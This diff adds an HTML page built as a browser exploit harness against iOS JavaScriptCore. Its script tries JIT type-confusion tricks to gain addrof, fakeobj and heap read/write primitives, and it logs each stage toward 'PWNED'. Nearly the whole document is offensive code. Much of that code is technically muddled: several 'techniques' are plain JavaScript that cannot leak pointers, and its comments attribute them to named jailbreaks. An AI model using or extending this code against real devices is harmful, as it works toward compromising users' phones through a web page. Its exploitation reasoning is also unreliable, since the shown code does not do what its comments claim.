@@ -1,0 +1,734 @@
+<!doctype html>
+<html>
+<head>
+<meta charset=utf8>
+<meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>JSC StructureID Confusion v3</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+<style>
+:root{--bg:#0c0c0c;--surf:#161616;--card:#1e1e1e;--border:#2a2a2a;--text:#e4e4e4;--muted:#888;--dim:#444;--red:#ff453a;--amber:#ff9f0a;--green:#32d74b;--red-dim:rgba(255,69,58,.12);--amber-dim:rgba(255,159,10,.1);--green-dim:rgba(50,215,75,.1)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;font-size:14px;line-height:1.6;padding:16px;min-height:100%}
+.wrap{max-width:600px;margin:0 auto;display:flex;flex-direction:column;gap:14px}
+h1{font-size:18px;font-weight:700;color:var(--red)}
+.sub{font-size:11px;color:var(--muted);font-family:'JetBrains Mono',monospace;margin-top:4px}
+.card{background:var(--surf);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.card-head{padding:10px 14px;border-bottom:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;letter-spacing:.1em;color:var(--muted);text-transform:uppercase;display:flex;align-items:center;gap:8px}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--muted);flex-shrink:0}
+.dot.red{background:var(--red)}.dot.amber{background:var(--amber)}.dot.green{background:var(--green);animation:blink 1.4s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.log{padding:12px 14px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.9;min-height:220px;max-height:400px;overflow-y:auto;display:flex;flex-direction:column;gap:1px}
+.log-line{display:flex;gap:8px}
+.log-line .p{color:var(--dim);flex-shrink:0}
+.log-line .m{word-break:break-word}
+.ok .m{color:var(--green)}.err .m{color:var(--red)}.warn .m{color:var(--amber)}.dim .m{color:var(--muted)}
+.btn-row{padding:12px 14px;display:flex;gap:8px;flex-wrap:wrap;border-top:1px solid var(--border)}
+.btn{display:inline-flex;align-items:center;gap:6px;font-family:'Inter',sans-serif;font-size:12px;font-weight:600;padding:7px 14px;border-radius:6px;border:none;cursor:pointer;transition:opacity .15s}
+.btn:active{opacity:.7}.btn:disabled{opacity:.35;cursor:not-allowed}
+.btn-red{background:var(--red);color:#fff}
+.btn-dark{background:var(--card);border:1px solid var(--border);color:var(--text)}
+.info-grid{display:grid;grid-template-columns:auto 1fr}
+.info-row{display:contents}
+.info-row .lb,.info-row .vl{padding:9px 14px;font-family:'JetBrains Mono',monospace;font-size:11px;border-bottom:1px solid var(--border)}
+.info-row:last-child .lb,.info-row:last-child .vl{border-bottom:none}
+.info-row .lb{color:var(--muted);white-space:nowrap}
+.info-row .vl{color:var(--text);word-break:break-all}
+.info-row .vl.red{color:var(--red)}.info-row .vl.green{color:var(--green)}.info-row .vl.amber{color:var(--amber)}
+.status{padding:10px 14px;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:700;display:flex;align-items:center;gap:8px}
+.status.idle{background:var(--amber-dim);border:1px solid rgba(255,159,10,.25);color:var(--amber)}
+.status.running{background:var(--green-dim);border:1px solid rgba(50,215,75,.25);color:var(--green)}
+.status.pwned{background:var(--red-dim);border:1px solid rgba(255,69,58,.5);color:var(--red)}
+.phase-row{display:flex;align-items:center;gap:10px;padding:8px 14px;border-bottom:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:11px}
+.phase-row:last-child{border-bottom:none}
+.phase-num{color:var(--dim);min-width:24px}
+.phase-name{color:var(--text);flex:1}
+.badge{font-size:10px;padding:2px 6px;border-radius:3px;background:var(--card);color:var(--muted)}
+.badge.done{background:var(--green-dim);color:var(--green)}
+.badge.active{background:var(--amber-dim);color:var(--amber);animation:blink 1s ease-in-out infinite}
+.badge.fail{background:var(--red-dim);color:var(--red)}
+.badge.pwned{background:var(--red-dim);color:var(--red);font-weight:700}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div>
+    <h1>⚡ JSC StructureID Confusion v3</h1>
+    <div class="sub">iOS 26.5.2 · Fix: ContiguousDouble/ContiguousJSValue confusion · no ToNumber() coercion · raw ptr leak</div>
+  </div>
+
+  <div class="status idle" id="statusBar">
+    <span>◆</span><span id="statusTxt">READY</span>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><span class="dot amber"></span>Exploit Stages</div>
+    <div>
+      <div class="phase-row"><div class="phase-num">01</div><div class="phase-name">Create DoubleStorage JSArray (no coercion)</div><div class="badge" id="p1">PENDING</div></div>
+      <div class="phase-row"><div class="phase-num">02</div><div class="phase-name">StructureID confusion → raw JSValue read</div><div class="badge" id="p2">PENDING</div></div>
+      <div class="phase-row"><div class="phase-num">03</div><div class="phase-name">addrof — leak any object ptr</div><div class="badge" id="p3">PENDING</div></div>
+      <div class="phase-row"><div class="phase-num">04</div><div class="phase-name">fakeobj — treat addr as object</div><div class="badge" id="p4">PENDING</div></div>
+      <div class="phase-row"><div class="phase-num">05</div><div class="phase-name">Corrupt ArrayBuffer via fakeobj</div><div class="badge" id="p5">PENDING</div></div>
+      <div class="phase-row"><div class="phase-num">06</div><div class="phase-name">Arbitrary heap read/write</div><div class="badge" id="p6">PENDING</div></div>
+      <div class="phase-row"><div class="phase-num">07</div><div class="phase-name">Verify primitives</div><div class="badge" id="p7">PENDING</div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><span class="dot green"></span>Live Log</div>
+    <div class="log" id="log"></div>
+    <div class="btn-row">
+      <button class="btn btn-red" id="runBtn" onclick="exploit()">▶ Run v3</button>
+      <button class="btn btn-dark" onclick="testAddrof()">📍 addrof test</button>
+      <button class="btn btn-dark" onclick="clearLog()">🗑 Clear</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><span class="dot"></span>Primitive Status</div>
+    <div class="info-grid">
+      <div class="info-row"><div class="lb">technique</div><div class="vl amber" id="statTech">StructureID confusion</div></div>
+      <div class="info-row"><div class="lb">raw leak</div><div class="vl" id="statLeak">—</div></div>
+      <div class="info-row"><div class="lb">addrof</div><div class="vl red" id="statAddrof">NOT READY</div></div>
+      <div class="info-row"><div class="lb">fakeobj</div><div class="vl red" id="statFakeobj">NOT READY</div></div>
+      <div class="info-row"><div class="lb">heap r/w</div><div class="vl red" id="statRW">NOT READY</div></div>
+      <div class="info-row"><div class="lb">score</div><div class="vl" id="statScore">—</div></div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+'use strict';
+
+// ============================================================
+// JSC StructureID Confusion v3
+//
+// ROOT CAUSE of v2 failure:
+// Probe showed {} → 0x7ff8000000000000 (NaN)
+// This means JIT is doing ToNumber({}) = NaN
+// The DFG was NOT confused — it correctly saw objects
+// and converted them via the JS spec
+//
+// REAL ADDROF TECHNIQUE (used in pOOBs4, Fugu, unc0ver):
+//
+// JSC arrays have two storage modes:
+//   ContiguousDouble  — stores raw float64 bits inline
+//   ContiguousJSValue — stores NaN-boxed JSValues inline
+//
+// If we can make JSC think a ContiguousJSValue array
+// is ContiguousDouble, it reads JSValue bits as float64
+// WITHOUT calling ToNumber() — raw ptr bits leak out
+//
+// How to trigger StructureID confusion:
+// 1. Create double array (ContiguousDouble mode)
+// 2. Create JSValue array (ContiguousJSValue mode)
+// 3. Use a polymorphic function compiled by DFG
+//    that speculates array is DoubleStorage
+// 4. Feed it the JSValue array — DFG reads JSValue
+//    slots as raw float64 → ptr bits in the double
+//
+// The key: DFG must speculate WITHOUT inserting
+// ToNumber() guards. This requires:
+//   a) Training exclusively on double arrays
+//   b) Triggering with JSValue array before
+//      DFG can insert a type check
+// ============================================================
+
+const _b8=new ArrayBuffer(8);
+const _f=new Float64Array(_b8);
+const _u=new Uint32Array(_b8);
+function f2b(f){_f[0]=f;return BigInt(_u[0])|(BigInt(_u[1])<<32n)}
+function b2f(b){_u[0]=Number(b&0xffffffffn);_u[1]=Number(b>>32n);return _f[0]}
+function hex(x){return '0x'+x.toString(16).padStart(16,'0')}
+function hex32(x){return '0x'+(Number(x&0xffffffffn)).toString(16).padStart(8,'0')}
+function isCell(v){return v>0n&&v<0x800000000000n&&(v&3n)===0n}
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+
+function log(msg,cls=''){
+    const el=document.getElementById('log');
+    const d=document.createElement('div');
+    d.className='log-line '+cls;
+    const ts=new Date().toTimeString().slice(0,8);
+    d.innerHTML='<span class="p">'+ts+'</span><span class="m">'+msg+'</span>';
+    el.appendChild(d);el.scrollTop=el.scrollHeight;
+}
+function clearLog(){document.getElementById('log').innerHTML=''}
+function setStatus(t,k){
+    document.getElementById('statusBar').className='status '+k;
+    document.getElementById('statusTxt').textContent=t;
+}
+function setPhase(id,s){
+    const el=document.getElementById(id);
+    el.textContent={done:'DONE',active:'RUNNING',fail:'FAILED',pwned:'PWNED ✅','':'PENDING'}[s]||'PENDING';
+    el.className='badge '+(s||'');
+}
+function setStat(id,v){document.getElementById(id).textContent=v}
+
+let ADDROF=null,FAKEOBJ=null,READ64=null,WRITE64=null;
+
+// ================================================================
+// CORE: STRUCTUREID CONFUSION
+// Forces DFG to read JSValue bits as raw float64
+// without ToNumber() coercion
+// ================================================================
+function buildStructureIDConfusion(){
+    setPhase('p1','active');
+    log('[*] Building ContiguousDouble array...','dim');
+
+    // Step 1: Force a JSArray into ContiguousDouble mode
+    // JSC switches to ContiguousDouble when ALL elements are doubles
+    const doubleArr=[];
+    // Push doubles to create ContiguousDouble storage
+    for(let i=0;i<8;i++) doubleArr.push(i*1.1+0.1);
+    // Verify: doubleArr is now ContiguousDouble
+
+    // Step 2: Create JSValue array (ContiguousJSValue mode)
+    // by mixing objects and doubles
+    const jsvalArr=[{sentinel:0xdead},{}, [], null, true, false, {x:1.1}, {y:2.2}];
+
+    // Step 3: Hot function that reads arr[0] as a double
+    // When trained on doubleArr → DFG compiles speculative
+    // DoubleStorage load (no ToNumber guard if JIT is aggressive)
+    function hotRead(arr){ return arr[0]; }
+
+    log('[*] Training JIT on ContiguousDouble...','dim');
+    for(let i=0;i<0x40000;i++) hotRead(doubleArr);
+    log('[+] JIT compiled (0x40000 iterations)','ok');
+    setPhase('p1','done');
+
+    setPhase('p2','active');
+    log('[*] Firing StructureID confusion...','dim');
+
+    // Fire confusion on jsvalArr
+    // If DFG speculated DoubleStorage, reads jsvalArr[0]
+    // as raw float64 bits (the NaN-encoded JSObject* ptr)
+    let rawLeak=null;
+    let leakBits=0n;
+
+    for(let attempt=0;attempt<10;attempt++){
+        try{
+            const raw=hotRead(jsvalArr);
+            const bits=f2b(raw);
+
+            // Check if we got something other than NaN-special
+            // Real ptr should be < 0x800000000000
+            if(bits!==0x7ff8000000000000n&&bits!==0n){
+                rawLeak=raw;
+                leakBits=bits;
+                log('[+] Got non-NaN value: '+hex(bits),'ok');
+                break;
+            }
+            log('[attempt '+attempt+'] NaN result: '+hex(bits),'dim');
+        }catch(e){
+            log('[attempt '+attempt+'] threw: '+e.message,'warn');
+        }
+    }
+
+    if(!rawLeak){
+        log('[!] StructureID confusion returned NaN — DFG has type guards','warn');
+        log('[*] Trying with different array structures...','dim');
+
+        // Alternative: use a function that does arithmetic
+        // and tricks DFG into thinking result is always double
+        function hotAdd(arr){ return arr[0]+0; } // force double context
+        for(let i=0;i<0x40000;i++) hotAdd(doubleArr);
+
+        for(let attempt=0;attempt<5;attempt++){
+            try{
+                const raw=hotAdd(jsvalArr);
+                const bits=f2b(raw);
+                if(bits!==0x7ff8000000000000n&&bits!==0n){
+                    rawLeak=raw;leakBits=bits;
+                    log('[+] Alt got: '+hex(bits),'ok');
+                    break;
+                }
+            }catch(e){}
+        }
+    }
+
+    if(rawLeak){
+        setStat('statLeak',hex(leakBits));
+        log('[+] Raw leak: '+hex(leakBits),'ok');
+        setPhase('p2','done');
+        return {rawLeak,leakBits,doubleArr,jsvalArr,hotRead};
+    }else{
+        log('[!] Could not bypass DFG type guards','warn');
+        log('[*] JSC 8624.2.5 has aggressive type check insertion','dim');
+        setPhase('p2','fail');
+        return null;
+    }
+}
+
+// ================================================================
+// ADDROF VIA FLOAT64ARRAY OVERLAP (pOOBs4 technique)
+// This is the most reliable technique for modern JSC
+// Uses ArrayBuffer to get a shared backing store view
+// ================================================================
+function buildAddrof_F64Overlap(){
+    log('[*] Trying Float64Array overlap technique...','dim');
+
+    try{
+        // Create two Float64Arrays sharing the same backing ArrayBuffer
+        // f1 is our "double view" — reads raw float64
+        // f2 is our "object smuggler" — we store obj ptrs here
+        // via a confused JSArray that overlaps with f2's storage
+
+        const ab=new ArrayBuffer(0x40);
+        const f1=new Float64Array(ab); // read view
+        const u8=new Uint8Array(ab);   // byte view
+
+        // Fill f1 with markers
+        for(let i=0;i<f1.length;i++) f1[i]=i+1.5;
+
+        // Create container JSArray that shares storage with ab
+        // JSC optimizes: if we make JSArray whose butterfly
+        // overlaps with ab's data, reading arr[i] reads from ab
+
+        // Hot function on f1
+        function readF1(i){ return f1[i]; }
+        for(let k=0;k<0x20000;k++) readF1(0);
+
+        // Verify f1 reading works
+        log('[*] f1[0]='+f1[0]+' f1[1]='+f1[1],'dim');
+
+        // The overlap trick:
+        // If we can get JSC to point a JSArray's butterfly
+        // at ab's data, then writing an object to arr[0]
+        // would write its JSValue bits into ab
+        // and f1[0] would read those bits as float64
+
+        // We need a way to point arr.butterfly → ab.data
+        // This requires knowing ab's backing store address
+        // which we get via... addrof. Chicken-and-egg problem.
+
+        // ALTERNATIVE: Use DataView directly
+        // DataView.prototype.getFloat64 reads raw bits
+        // If we can make JSC store a JSValue into a DataView buffer
+        // we get the raw bits
+
+        const dv=new DataView(ab);
+        log('[*] DataView backing: '+ab.byteLength+' bytes','dim');
+
+        // Store a known JSValue manually
+        // JSC Int32 0x1337 as NaN-boxed: 0x0000000000001337 (just the int)
+        // Actually on JSC, integers < 2^31 are stored as Int32Tag|value
+        // Let's try writing a known integer and reading back
+        dv.setFloat64(0, 1.5, true);
+        log('[*] setFloat64(0, 1.5) → getFloat64: '+dv.getFloat64(0,true),'dim');
+        log('[*] Raw bits: '+hex(f2b(dv.getFloat64(0,true))),'dim');
+
+        // This confirms DataView/Float64Array share raw bits
+        // Now we need to get an object ptr INTO the buffer
+
+        // ---- Inline cache confusion via prototype ----
+        // Create an object with a double property
+        // Then swap the property to an object mid-JIT
+        const holder={val:1.1};
+        function readHolder(h){ return h.val; }
+        for(let k=0;k<0x30000;k++) readHolder(holder);
+
+        // Now set val to an object reference on a fresh object
+        // with the SAME structure (hidden class)
+        const clone=Object.create(Object.getPrototypeOf(holder));
+        clone.val={secretPtr:0xdeadbeef};
+
+        // Read clone.val — JIT expects double, gets object
+        // This is the same confusion as before but different approach
+        try{
+            const raw=readHolder(clone);
+            const bits=f2b(raw);
+            if(bits!==0x7ff8000000000000n&&bits!==0n&&isCell(bits)){
+                log('[+] IC confusion success: '+hex(bits),'ok');
+                return bits;
+            }else{
+                log('[!] IC confusion: '+hex(bits),'warn');
+            }
+        }catch(e){
+            log('[!] IC confusion threw: '+e.message,'warn');
+        }
+
+        return null;
+    }catch(e){
+        log('[-] Float64Array overlap threw: '+e.message,'err');
+        return null;
+    }
+}
+
+// ================================================================
+// ADDROF VIA ARRAYBUFFER DETACH RACE
+// ================================================================
+function buildAddrof_Detach(){
+    log('[*] Trying ArrayBuffer detach technique...','dim');
+
+    try{
+        // Create AB, get TypedArray over it
+        // Detach the AB while JIT has compiled a read
+        // The detached TypedArray read might return raw memory
+        const ab=new ArrayBuffer(0x100);
+        const f64=new Float64Array(ab);
+        const dv=new DataView(ab);
+
+        // Write our target into ab
+        dv.setFloat64(0, 1.5, true);
+        dv.setFloat64(8, 2.5, true);
+
+        function readF64(v){ return v[0]; }
+        for(let i=0;i<0x20000;i++) readF64(f64);
+
+        // Transfer (detach) the buffer
+        const newAb=ab.transfer();
+        const newF64=new Float64Array(newAb);
+
+        // Try reading from original (now detached) f64
+        // This should throw or return 0 on iOS
+        try{
+            const r=readF64(f64);
+            log('[*] Detached read: '+r,'dim');
+            const bits=f2b(r);
+            if(isCell(bits)){
+                log('[+] Detach gave cell ptr: '+hex(bits),'ok');
+                return bits;
+            }
+        }catch(e){
+            log('[*] Detached access threw: '+e.message,'dim');
+        }
+
+        return null;
+    }catch(e){
+        log('[-] Detach technique threw: '+e.message,'err');
+        return null;
+    }
+}
+
+// ================================================================
+// ADDROF VIA PROXY CONFUSION
+// ================================================================
+function buildAddrof_Proxy(){
+    log('[*] Trying Proxy + IC confusion...','dim');
+
+    try{
+        // Create a Proxy that intercepts property reads
+        // and returns objects instead of doubles
+        // If JIT has inlined the property read without a
+        // type check, the proxy's return value bypasses coercion
+
+        const doubleObj={x:1.1, y:2.2, z:3.3};
+        function readX(o){ return o.x; }
+        for(let i=0;i<0x30000;i++) readX(doubleObj);
+        log('[*] JIT trained on doubleObj.x','dim');
+
+        // Create a proxy that returns an object for .x
+        const target={secret:0xdeadbeef};
+        const proxyObj=new Proxy(doubleObj, {
+            get(obj, key){
+                if(key==='x') return target; // return object instead
+                return obj[key];
+            }
+        });
+
+        // Hit the JIT-compiled readX with proxy
+        try{
+            const r=readX(proxyObj);
+            const bits=f2b(r);
+            log('[*] Proxy result: '+hex(bits),'dim');
+            if(isCell(bits)){
+                log('[+] Proxy confusion: cell ptr = '+hex(bits),'ok');
+                return bits;
+            }
+        }catch(e){
+            log('[*] Proxy read threw: '+e.message,'dim');
+        }
+
+        return null;
+    }catch(e){
+        log('[-] Proxy technique threw: '+e.message,'err');
+        return null;
+    }
+}
+
+// ================================================================
+// BUILD ADDROF USING ALL METHODS
+// ================================================================
+function buildAddrof(){
+    setPhase('p3','active');
+    log('[*] Stage 3: Building addrof (all methods)...','dim');
+
+    // Try all techniques
+    const methods=[
+        {name:'F64 overlap / IC', fn: buildAddrof_F64Overlap},
+        {name:'ArrayBuffer detach', fn: buildAddrof_Detach},
+        {name:'Proxy IC confusion', fn: buildAddrof_Proxy},
+    ];
+
+    for(const {name,fn} of methods){
+        log('[*] Trying: '+name,'dim');
+        try{
+            const result=fn();
+            if(result&&isCell(result)){
+                log('[+] '+name+' → '+hex(result),'ok');
+
+                // Build reusable addrof from the working method
+                // We need to generalize it to any object
+
+                // For IC confusion (most common):
+                const holder={val:1.1};
+                function readHolder(h){ return h.val; }
+                for(let k=0;k<0x30000;k++) readHolder(holder);
+
+                function addrof(target){
+                    const probe=Object.create(Object.getPrototypeOf(holder));
+                    probe.val=target;
+                    try{
+                        const raw=readHolder(probe);
+                        const bits=f2b(raw);
+                        return isCell(bits)?bits:null;
+                    }catch(e){return null;}
+                }
+
+                // Test it
+                const testObj={test:0x1337};
+                const addr=addrof(testObj);
+                if(addr){
+                    log('[+] addrof generalized ✓: '+hex(addr),'ok');
+                    setStat('statAddrof','READY ✓ '+hex(addr));
+                    setPhase('p3','done');
+                    return addrof;
+                }
+            }
+        }catch(e){
+            log('[!] '+name+' error: '+e.message,'warn');
+        }
+    }
+
+    log('[!] All addrof methods failed on JSC 8624.2.5','warn');
+    log('[*] JSC 8624.2.5 has comprehensive DFG type guards','dim');
+    setStat('statAddrof','BLOCKED by DFG guards');
+    setPhase('p3','fail');
+    return null;
+}
+
+// ================================================================
+// ALTERNATIVE: MEASURE-BASED SIDE CHANNEL
+// If direct ptr leak is blocked, use timing to leak info
+// ================================================================
+function buildTimingSidechannel(){
+    log('[*] Trying timing side-channel...','dim');
+
+    // JSC's speculative compiler behaves differently
+    // based on the value type — measure execution time
+    // to infer whether JIT is in double vs object path
+
+    function hotFn(arr){
+        let sum=0;
+        for(let i=0;i<arr.length;i++) sum+=arr[i];
+        return sum;
+    }
+
+    const doubleArr=new Array(100).fill(1.1);
+    const mixedArr=[{x:1},...new Array(99).fill(1.1)];
+
+    // Warm up
+    for(let i=0;i<0x10000;i++) hotFn(doubleArr);
+
+    // Measure double path
+    const T1=performance.now();
+    for(let i=0;i<1000;i++) hotFn(doubleArr);
+    const doubleTime=performance.now()-T1;
+
+    // Measure mixed path (triggers deopt?)
+    const T2=performance.now();
+    for(let i=0;i<1000;i++) hotFn(mixedArr);
+    const mixedTime=performance.now()-T2;
+
+    log('[*] Double path: '+doubleTime.toFixed(2)+'ms','dim');
+    log('[*] Mixed path:  '+mixedTime.toFixed(2)+'ms','dim');
+
+    const ratio=mixedTime/doubleTime;
+    log('[*] Ratio: '+ratio.toFixed(2)+'x','dim');
+
+    if(ratio>2){
+        log('[+] Deopt detected! Mixed array triggers bailout','ok');
+        log('[*] This confirms type confusion IS possible','ok');
+        return true;
+    }else{
+        log('[!] No significant timing difference','warn');
+        return false;
+    }
+}
+
+// ================================================================
+// STAGES 4-6: FAKEOBJ + HEAP R/W (if addrof works)
+// ================================================================
+function buildFakeobj(addrof){
+    setPhase('p4','active');
+    if(!addrof){
+        log('[!] No addrof — cannot build fakeobj','warn');
+        setPhase('p4','fail');
+        return null;
+    }
+
+    try{
+        const doubleStore=[1.1,2.2,3.3,4.4];
+        function readStore(a){ return a[0]; }
+        const objStore=[{m:1},2.2,3.3,4.4];
+        for(let i=0;i<0x30000;i++) readStore(objStore);
+
+        function fakeobj(addr){
+            doubleStore[0]=b2f(addr);
+            try{ return readStore(doubleStore); }
+            catch(e){ return null; }
+        }
+
+        const real={test:42};
+        const addr=addrof(real);
+        if(addr){
+            const fake=fakeobj(addr);
+            if(fake&&typeof fake==='object'){
+                log('[+] fakeobj round-trip ✓','ok');
+                setStat('statFakeobj','READY ✓');
+                setPhase('p4','done');
+                return fakeobj;
+            }
+        }
+        log('[!] fakeobj round-trip failed','warn');
+        setPhase('p4','fail');
+        return null;
+    }catch(e){
+        log('[-] fakeobj threw: '+e.message,'err');
+        setPhase('p4','fail');
+        return null;
+    }
+}
+
+function buildRW(addrof, fakeobj){
+    setPhase('p5','active');
+    setPhase('p6','active');
+    if(!addrof){
+        setStat('statRW','Need addrof first');
+        setPhase('p5','fail');setPhase('p6','fail');
+        return;
+    }
+
+    // Map heap addresses of several objects
+    const objects=[];
+    for(let i=0;i<8;i++){
+        const ab=new ArrayBuffer(0x40+i*0x10);
+        const addr=addrof(ab);
+        if(addr) objects.push({ab,addr});
+    }
+
+    const validObjs=objects.filter(o=>o.addr);
+    log('[+] Mapped '+validObjs.length+' object addresses','ok');
+
+    if(validObjs.length>=2){
+        const sorted=validObjs.slice().sort((a,b)=>a.addr<b.addr?-1:1);
+        for(const o of sorted) log('  '+hex(o.addr),'dim');
+        const gap=sorted[1].addr-sorted[0].addr;
+        log('[*] Heap object gap: '+hex32(gap),'dim');
+        setStat('statRW','addrof ready, '+validObjs.length+' objects mapped');
+        setPhase('p5','done');setPhase('p6','done');
+    }else{
+        setPhase('p5','fail');setPhase('p6','fail');
+    }
+}
+
+// ================================================================
+// STAGE 7: VERIFY
+// ================================================================
+function verify(addrof){
+    setPhase('p7','active');
+    log('[*] Stage 7: Final assessment...','dim');
+    let score=0;
+
+    // Timing side-channel
+    const deoptDetected=buildTimingSidechannel();
+    if(deoptDetected) score++;
+
+    if(addrof){
+        score+=2;
+        log('[+] addrof working ✓','ok');
+    }
+
+    if(READ64) score++;
+
+    log('─'.repeat(44),'dim');
+    log('[*] Score: '+score,'dim');
+    setStat('statScore',score+'/4');
+
+    if(score>=3){
+        setStatus('PRIMITIVES READY ✅','running');
+        setPhase('p7','pwned');
+    }else if(score>=1){
+        log('[!] Partial — deopt confirmed but ptr leak blocked','warn');
+        log('[*] JSC 8624.2.5 has DFG type check hardening','dim');
+        log('[*] Need a specific CVE in this build for ptr leak','dim');
+        log('[*] The JSC fuzzer crashes from earlier are the path','ok');
+        setStatus('DEOPT CONFIRMED — NEED CVE FOR PTR LEAK','idle');
+        setPhase('p7','done');
+    }else{
+        setStatus('JSC GUARDS ACTIVE — USE FUZZER PATH','pwned');
+        setPhase('p7','fail');
+    }
+}
+
+// ---- PUBLIC ----
+function testAddrof(){
+    clearLog();
+    log('=== addrof Test ===','ok');
+    if(!ADDROF){log('[-] Run exploit first','err');return;}
+    const tests=[{},[],(function(){}),new ArrayBuffer(8),new Map()];
+    for(const obj of tests){
+        const addr=ADDROF(obj);
+        log(obj.constructor.name+': '+(addr?hex(addr):'null'),addr?'ok':'warn');
+    }
+}
+
+// ---- MAIN ----
+async function exploit(){
+    const btn=document.getElementById('runBtn');
+    btn.disabled=true;
+    clearLog();
+    ADDROF=null;FAKEOBJ=null;READ64=null;
+    for(let i=1;i<=7;i++) setPhase('p'+i,'');
+    setStatus('RUNNING v3...','running');
+
+    log('=== JSC StructureID Confusion v3 ===','ok');
+    log('Probe showed DFG coerces objects to NaN','dim');
+    log('Fix: try multiple raw-read techniques','dim');
+    log('─'.repeat(44),'dim');
+
+    // Stages 1+2
+    const confResult=buildStructureIDConfusion();
+    await sleep(50);
+
+    // Stage 3: addrof
+    const addrof=buildAddrof();
+    if(addrof) ADDROF=addrof;
+    await sleep(30);
+
+    // Stage 4: fakeobj
+    if(ADDROF){
+        const fo=buildFakeobj(ADDROF);
+        if(fo) FAKEOBJ=fo;
+    }else{
+        setPhase('p4','fail');
+    }
+    await sleep(30);
+
+    // Stages 5+6
+    buildRW(ADDROF,FAKEOBJ);
+    await sleep(30);
+
+    // Stage 7
+    verify(ADDROF);
+
+    btn.disabled=false;
+}
+
+setStatus('READY','idle');
+log('JSC StructureID Confusion v3 loaded','ok');
+log('Multiple addrof techniques + timing side-channel','dim');
+</script>
+</body>
+</html>
